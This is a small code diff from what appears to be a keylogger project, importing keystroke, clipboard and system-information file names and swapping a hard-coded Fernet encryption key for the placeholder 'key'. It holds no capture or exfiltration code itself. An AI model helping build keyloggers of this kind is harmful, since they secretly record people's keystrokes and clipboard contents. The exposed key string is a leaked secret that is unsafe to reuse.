@@ -2,7 +2,7 @@ from cryptography.fernet import Fernet
 
 from project.keylogger import system_information_e, clipboard_information_e, keys_information_e, count
 
-key = "M3ySo5VU5kNP9KJQLw4b0yQVPCH-kg-vJTNx6TTbkIw="
+key = "key"
 
 system_information_e = "e_system.txt"
 clipboard_information_e = "e_clipboard.txt"
